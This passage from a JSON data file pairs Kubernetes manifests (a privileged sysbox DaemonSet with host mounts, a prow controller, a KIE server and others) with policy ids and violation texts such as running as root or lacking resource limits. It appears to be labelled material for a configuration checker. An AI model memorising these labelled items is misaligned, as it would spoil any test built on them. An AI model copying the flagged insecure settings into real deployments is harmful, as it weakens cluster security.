host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sysbox-deploy-k8s\" is not set to runAsNonRoot"
  },
  {
    "id": "11155",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/etc\" is mounted on container \"sysbox-deploy-k8s\""
  },
  {
    "id": "11156",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sysbox-deploy-k8s\" has cpu request 0"
  },
  {
    "id": "11157",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sysbox-deploy-k8s\" has memory limit 0"
  },
  {
    "id": "11158",
    "manifest_path": "data/manifests/the_stack_sample/sample_4294.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210906-6cb55987fb\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prow-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "11159",
    "manifest_path": "data/manifests/the_stack_sample/sample_4294.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210906-6cb55987fb\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-controller-manager\" not found"
  },
  {
    "id": "11160",
    "manifest_path": "data/manifests/the_stack_sample/sample_4294.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210906-6cb55987fb\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "11161",
    "manifest_path": "data/manifests/the_stack_sample/sample_4294.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210906-6cb55987fb\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prow-controller-manager\" has cpu request 0"
  },
  {
    "id": "11162",
    "manifest_path": "data/manifests/the_stack_sample/sample_4294.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20210906-6cb55987fb\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prow-controller-manager\" has memory limit 0"
  },
  {
    "id": "11163",
    "manifest_path": "data/manifests/the_stack_sample/sample_4297.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: hammer\n  name: hammer\n  namespace: istio-workload\nspec:\n  containers:\n  - image: gcr.io/nmiu-play/hammer\n    imagePullPolicy: Always\n    name: hammer\n    resources:\n      limits:\n        cpu: 500m\n        memory: 128Mi\n      requests:\n        cpu: 100m\n        memory: 128Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hammer\" is using an invalid container image, \"gcr.io/nmiu-play/hammer\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11164",
    "manifest_path": "data/manifests/the_stack_sample/sample_4297.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: hammer\n  name: hammer\n  namespace: istio-workload\nspec:\n  containers:\n  - image: gcr.io/nmiu-play/hammer\n    imagePullPolicy: Always\n    name: hammer\n    resources:\n      limits:\n        cpu: 500m\n        memory: 128Mi\n      requests:\n        cpu: 100m\n        memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hammer\" does not have a read-only root file system"
  },
  {
    "id": "11165",
    "manifest_path": "data/manifests/the_stack_sample/sample_4297.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: hammer\n  name: hammer\n  namespace: istio-workload\nspec:\n  containers:\n  - image: gcr.io/nmiu-play/hammer\n    imagePullPolicy: Always\n    name: hammer\n    resources:\n      limits:\n        cpu: 500m\n        memory: 128Mi\n      requests:\n        cpu: 100m\n        memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hammer\" is not set to runAsNonRoot"
  },
  {
    "id": "11166",
    "manifest_path": "data/manifests/the_stack_sample/sample_4298.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: oase\n  name: kie-server\n  labels:\n    name: kie-server\nspec:\n  selector:\n    matchLabels:\n      name: kie-server\n  template:\n    metadata:\n      labels:\n        name: kie-server\n    spec:\n      containers:\n      - name: kie-server\n        image: exastro/kie-server:latest\n        imagePullPolicy: IfNotPresent\n        resources: {}\n        env:\n        - name: KIE_SERVER_LOCATION\n          value: http://kie-server:8080/kie-server/services/rest/server\n        - name: KIE_SERVER_CONTROLLER\n          value: http://business-central:8080/business-central/rest/controller\n        - name: KIE_MAVEN_REPO\n          value: http://business-central:8080/business-central/maven2\n        - name: JAVA_OPTS\n          value: -Xms256m -Xmx2048m -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8\n        ports:\n        - name: service\n          containerPort: 8080\n        volumeMounts:\n        - name: share\n          mountPath: /opt/jboss/.m2/repository/com/oase\n          subPath: m2-repository\n          readOnly: false\n        securityContext:\n          capabilities: {}\n          privileged: false\n      volumes:\n      - name: share\n        persistentVolumeClaim:\n          claimName: share-pvc\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"kie-server\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "11167",
    "manifest_path": "data/manifests/the_stack_sample/sample_4298.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: oase\n  name: kie-server\n  labels:\n    name: kie-server\nspec:\n  selector:\n    matchLabels:\n      name: kie-server\n  template:\n    metadata:\n      labels:\n        name: kie-server\n    spec:\n      containers:\n      - name: kie-server\n        image: exastro/kie-server:latest\n        imagePullPolicy: IfNotPresent\n        resources: {}\n        env:\n        - name: KIE_SERVER_LOCATION\n          value: http://kie-server:8080/kie-server/services/rest/server\n        - name: KIE_SERVER_CONTROLLER\n          value: http://business-central:8080/business-central/rest/controller\n        - name: KIE_MAVEN_REPO\n          value: http://business-central:8080/business-central/maven2\n        - name: JAVA_OPTS\n          value: -Xms256m -Xmx2048m -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8\n        ports:\n        - name: service\n          containerPort: 8080\n        volumeMounts:\n        - name: share\n          mountPath: /opt/jboss/.m2/repository/com/oase\n          subPath: m2-repository\n          readOnly: false\n        securityContext:\n          capabilities: {}\n          privileged: false\n      volumes:\n      - name: share\n        persistentVolumeClaim:\n          claimName: share-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kie-server\" is using an invalid container image, \"exastro/kie-server:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11168",
    "manifest_path": "data/manifests/the_stack_sample/sample_4298.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: oase\n  name: kie-server\n  labels:\n    name: kie-server\nspec:\n  selector:\n    matchLabels:\n      name: kie-server\n  template:\n    metadata:\n      labels:\n        name: kie-server\n    spec:\n      containers:\n      - name: kie-server\n        image: exastro/kie-server:latest\n        imagePullPolicy: IfNotPresent\n        resources: {}\n        env:\n        - name: KIE_SERVER_LOCATION\n          value: http://kie-server:8080/kie-server/services/rest/server\n        - name: KIE_SERVER_CONTROLLER\n          value: http://business-central:8080/business-central/rest/controller\n        - name: KIE_MAVEN_REPO\n          value: http://business-central:8080/business-central/maven2\n        - name: JAVA_OPTS\n          value: -Xms256m -Xmx2048m -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8\n        ports:\n        - name: service\n          containerPort: 8080\n        volumeMounts:\n        - name: share\n          mountPath: /opt/jboss/.m2/repository/com/oase\n          subPath: m2-repository\n          readOnly: false\n        securityContext:\n          capabilities: {}\n          privileged: false\n      volumes:\n      - name: share\n        persistentVolumeClaim:\n          claimName: share-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kie-server\" does not have a read-only root file system"
  },
  {
    "id": "11169",
    "manifest_path": "data/manifests/the_stack_sample/sample_4298.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: oase\n  name: kie-server\n  labels:\n    name: kie-server\nspec:\n  selector:\n    matchLabels:\n      name: kie-server\n  template:\n    metadata:\n      labels:\n        name: kie-server\n    spec:\n      containers:\n      - name: kie-server\n        image: exastro/kie-server:latest\n        imagePullPolicy: IfNotPresent\n        resources: {}\n        env:\n        - name: KIE_SERVER_LOCATION\n          value: http://kie-server:8080/kie-server/services/rest/server\n        - name: KIE_SERVER_CONTROLLER\n          value: http://business-central:8080/business-central/rest/controller\n        - name: KIE_MAVEN_REPO\n          value: http://business-central:8080/business-central/maven2\n        - name: JAVA_OPTS\n          value: -Xms256m -Xmx2048m -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8\n        ports:\n        - name: service\n          containerPort: 8080\n        volumeMounts:\n        - name: share\n          mountPath: /opt/jboss/.m2/repository/com/oase\n          subPath: m2-repository\n          readOnly: false\n        securityContext:\n          capabilities: {}\n          privileged: false\n      volumes:\n      - name: share\n        persistentVolumeClaim:\n          claimName: share-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kie-server\" is not set to runAsNonRoot"
  },
  {
    "id": "11170",
    "manifest_path": "data/manifests/the_stack_sample/sample_4298.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: oase\n  name: kie-server\n  labels:\n    name: kie-server\nspec:\n  selector:\n    matchLabels:\n      name: kie-server\n  template:\n    metadata:\n      labels:\n        name: kie-server\n    spec:\n      containers:\n      - name: kie-server\n        image: exastro/kie-server:latest\n        imagePullPolicy: IfNotPresent\n        resources: {}\n        env:\n        - name: KIE_SERVER_LOCATION\n          value: http://kie-server:8080/kie-server/services/rest/server\n        - name: KIE_SERVER_CONTROLLER\n          value: http://business-central:8080/business-central/rest/controller\n        - name: KIE_MAVEN_REPO\n          value: http://business-central:8080/business-central/maven2\n        - name: JAVA_OPTS\n          value: -Xms256m -Xmx2048m -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8\n        ports:\n        - name: service\n          containerPort: 8080\n        volumeMounts:\n        - name: share\n          mountPath: /opt/jboss/.m2/repository/com/oase\n          subPath: m2-repository\n          readOnly: false\n        securityContext:\n          capabilities: {}\n          privileged: false\n      volumes:\n      - name: share\n        persistentVolumeClaim:\n          claimName: share-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kie-server\" has cpu request 0"
  },
  {
    "id": "11171",
    "manifest_path": "data/manifests/the_stack_sample/sample_4298.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: oase\n  name: kie-server\n  labels:\n    name: kie-server\nspec:\n  selector:\n    matchLabels:\n      name: kie-server\n  template:\n    metadata:\n      labels:\n        name: kie-server\n    spec:\n      containers:\n      - name: kie-server\n        image: exastro/kie-server:latest\n        imagePullPolicy: IfNotPresent\n        resources: {}\n        env:\n        - name: KIE_SERVER_LOCATION\n          value: http://kie-server:8080/kie-server/services/rest/server\n        - name: KIE_SERVER_CONTROLLER\n          value: http://business-central:8080/business-central/rest/controller\n        - name: KIE_MAVEN_REPO\n          value: http://business-central:8080/business-central/maven2\n        - name: JAVA_OPTS\n          value: -Xms256m -Xmx2048m -Djava.net.preferIPv4Stack=true -Dfile.encoding=UTF-8\n        ports:\n        - name: service\n          containerPort: 8080\n        volumeMounts:\n        - name: share\n          mountPath: /opt/jboss/.m2/repository/com/oase\n          subPath: m2-repository\n          readOnly: false\n        securityContext:\n          capabilities: {}\n          privileged: false\n      volumes:\n      - name: share\n        persistentVolumeClaim:\n          claimName: share-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kie-server\" has memory limit 0"
  },
  {
    "id": "11172",
    "manifest_path": "data/manifests/the_stack_sample/sample_4299.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: service-2048\n  namespace: 2048-game\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n  type: LoadBalancer\n  selector:\n    app: '2048'\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:2048])"
  },
  {
    "id": "11173",
    "manifest_path": "data/manifests/the_stack_sample/sample_4300.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: varnish-ingress\n  labels:\n    app: varnish-ingress\n  annotations:\n    service.alpha.kubernetes.io/tolerate-unready-endpoints: 'true'\nspec:\n  type: NodePort\n  ports:\n  - port: 6081\n    targetPort: 6081\n    protocol: TCP\n    name: varnishadm\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: http\n  selector:\n    app: varnish-ingress\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:varnish-ingress])"
  },
  {
    "id": "11174",
    "manifest_path": "data/manifests/the_stack_sample/sample_4301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-gce-pd-storage\n  labels:\n    app: reddit\n    component: mongo\n    comment-db: 'true'\n    post-db: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reddit\n      component: mongo\n  template:\n    metadata:\n      name: mongo\n      labels:\n        app: reddit\n        component: mongo\n        comment-db: 'true'\n        post-db: 'true'\n    spec:\n      containers:\n      - image: mongo:3.2\n        name: mongo\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "11175",
    "manifest_path": "data/manifests/the_stack_sample/sample_4301.yaml",
